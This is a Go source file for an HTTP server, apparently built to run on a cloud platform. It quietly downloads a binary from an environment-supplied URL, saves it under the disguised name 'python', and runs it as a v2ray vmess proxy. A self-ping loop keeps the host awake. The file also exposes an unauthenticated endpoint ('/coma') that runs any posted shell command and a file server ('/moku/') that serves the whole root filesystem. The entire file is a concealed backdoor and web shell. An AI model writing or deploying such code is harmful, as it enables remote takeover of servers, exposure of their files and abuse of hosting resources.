package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"
)

const isDebug = runtime.GOOS=="windows"
const path = "/"

var fileFunc= http.StripPrefix("/moku/",
http.FileServer(http.Dir(path))).ServeHTTP

var timeString []byte
var doneContent []byte
var selfUrl string
var rayPath string
var donePath string


func init()  {


	doneContent =[]byte("1")
	rand.Seed(time.Now().UnixNano())

	timeString=
		[]byte(time.Now().String()+" x "+
			strconv.FormatFloat(rand.Float64(),'E',-1,64))


	const rayFile = "python"
	const doneMark = "zen.txt"

	basePath := exeDir()
	rayPath=basePath+rayFile
	donePath=basePath+doneMark

	if !isDebug{

		selfUrl="https://"+os.Getenv("K_SERVICE")+".m3o.app/"
		go keepAlive()
		checkFile()
	}


}

func exeDir() string {
	exePath, _ := os.Executable()

	var index int
	if isDebug {
		index = strings.LastIndex(exePath, "\\")
	}else {
		index = strings.LastIndex(exePath,"/")
	}

	if index==0 {
		return "/"
	}
	return exePath[0:index+1]
}

func downloadFile(url string,size int) []byte  {

	client := http.Client{
		Timeout: 70 * time.Second,
	}
	req, _ := http.NewRequest(http.MethodGet, url, nil)
	req.Header.Add("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36")
	response, err := client.Do(req)

	if response==nil{
		return nil
	}

	if err!=nil || response.StatusCode!=200{
		response.Body.Close()
		return nil
	}

	bytes, err := io.ReadAll(response.Body)

	response.Body.Close()

	if err !=nil || len(bytes)!=size{
		return nil
	}


	return bytes

}
func runExec()  {

	fmt.Println("done exe")
	command := exec.Command(rayPath)
	command.Stdin=strings.NewReader(rayJson())
	command.Start()
}

func download()  {


	var file []byte

	rayUrl:=os.Getenv("RAY_URL")
	raySize,_:=strconv.Atoi(os.Getenv("RAY_SIZE"))

	for {
		file = downloadFile(rayUrl, raySize)
		if file !=nil {
			break
		}
		time.Sleep(time.Minute*4)
	}

	os.WriteFile(rayPath,file,0777)
	os.WriteFile(donePath,doneContent,0777)
	runExec()


}
func checkFile()  {

	_, err := os.Stat(rayPath)

	if err!=nil {

		os.Remove(rayPath)
		os.Remove(donePath)
		go download()
		return
	}
	_,err=os.Stat(donePath)

	if err!=nil {
		os.Remove(rayPath)
		os.Remove(donePath)
		go download()
		return
	}

	runExec()
}
func rayJson() string {
	const p1=
		"{\"routing\":{\"rules\":[{\"type\":\"field\",\"domain\":[\"real\"],\"outboundTag\":\"out-control\"}]},\"inbounds\":[{\"port\":44444,\"protocol\":\"vmess\",\"settings\":{\"clients\":[{\"id\":\""
	const p3 =
		"\",\"alterId\":0}]},\"streamSettings\":{\"network\":\"ws\"}}],\"outbounds\":[{\"protocol\":\"freedom\",\"settings\":{}},{\"protocol\":\"freedom\",\"settings\":{\"redirect\":\"127.0.0.1:0\"},\"tag\":\"out-control\"}]}"



	var uuid string
	var found bool
	if isDebug {
		uuid="11111111-0000-0000-0000-111111111111"
	}else {
		uuid,found=syscall.Getenv("PWD_UUID")
		if !found {
			uuid="11111111-0000-0000-0000-111111111111"
		}
	}

	return p1+uuid+p3
}

func moku(w http.ResponseWriter, r *http.Request)  {
	fileFunc(w,r)
}

func reboot(w http.ResponseWriter, r *http.Request)  {

	os.Exit(1)
}


func coma(w http.ResponseWriter, r *http.Request)  {

	bytes, _ := ioutil.ReadAll(r.Body)
	result := getCommandResult(string(bytes))
	w.Write([]byte(result))
}

func shu(w http.ResponseWriter, r *http.Request)  {
	w.Write(timeString)
}

func getCommandResult(source string) string  {

	var command *exec.Cmd

	ken := strings.Split(source, " ")
	exeName:=ken[0]
	if len(ken)==1{
		command = exec.Command(exeName)
	}else {
		args:=ken[1:]
		command =exec.Command(exeName,args...)
	}



	var out bytes.Buffer

	command.Stdout=&out
	command.Run()
	return out.String()
}

func keepAlive()  {
	for  {
		time.Sleep(3*time.Minute)
		resp, _ := http.Get(selfUrl)
		if resp!=nil{
			resp.Body.Close()
		}
	}
}

func main() {
	http.HandleFunc("/", shu)
	http.HandleFunc("/moku/", moku)
	http.HandleFunc("/jikan", shu)
	http.HandleFunc("/coma", coma)
	http.HandleFunc("/reboot", reboot)
	http.ListenAndServe(":80", nil)
}
